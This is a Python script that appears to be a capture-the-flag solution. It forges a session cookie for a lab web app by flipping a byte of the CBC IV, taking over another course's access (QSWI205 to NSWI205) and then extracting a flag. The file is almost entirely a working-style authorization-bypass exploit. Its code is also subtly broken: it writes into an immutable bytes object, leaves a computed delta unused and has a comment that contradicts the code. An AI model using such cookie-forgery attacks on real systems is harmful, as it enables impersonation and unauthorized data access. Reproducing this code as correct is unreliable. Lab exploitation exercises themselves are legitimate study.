import requests
import sys
import re
import random
import json

#172.24.0.2
ipsocket = "172.24.2.2:8080"
#ipsocket = sys.argv[1]
url = f"http://{ipsocket}"



s = requests.Session()
## create course
course_code = "QSWI205" #"KVI" + str(random.randint(100,1000))
data = {
    "code": course_code,
    "name": "Introduction to Computer Science",
    "sylabus": "Basic programming, algorithms, and data structures",
    "private_note": "Internal notes for staff only"
}



resp = s.post(f"{url}/create", data=data)
m = re.search(r"Your password is: (.*)<", resp.text)
password = m.group(1)



## login to course
resp = s.post(f"{url}/login/{course_code}", data={"password": password})

session_cookie = s.cookies.get("session") or resp.cookies.get("session")

iv = bytes.fromhex(session_cookie[:32])
encrypted_data = bytes.fromhex(session_cookie[32:-64])
mac = session_cookie[-64:]


target_course = "NSWI205"
original_plaintext = json.dumps({"courseid": course_code})
target_plaintext = json.dumps({"courseid": target_course})

# only change position 14 from 'M' to 'N'
delta = bytearray([0] * 16)
delta[14] = ord('M') ^ ord('N')  # 0x03

# Modify IV
iv_new = iv
iv_new[14] = iv[14] ^ (ord('Q') ^ ord('N'))
# Construct new cookie
new_session_cookie = iv_new.hex() + encrypted_data.hex() + mac

print("Original session cookie:", session_cookie)
print("New session cookie:", new_session_cookie)
print("Length:", len(new_session_cookie))

# set the new cookie and access the target course
s.cookies.clear()
s.cookies.set("session", new_session_cookie)

resp = s.get(f"{url}/course/{target_course}")
print("Response from target course:")
print(resp.text)


flag_match = re.search(r"pitfalls\{[^}]+\}", resp.text)
if flag_match:
    print("Fake flag:", flag_match.group(0))
else:
    print("Flag not found in response.")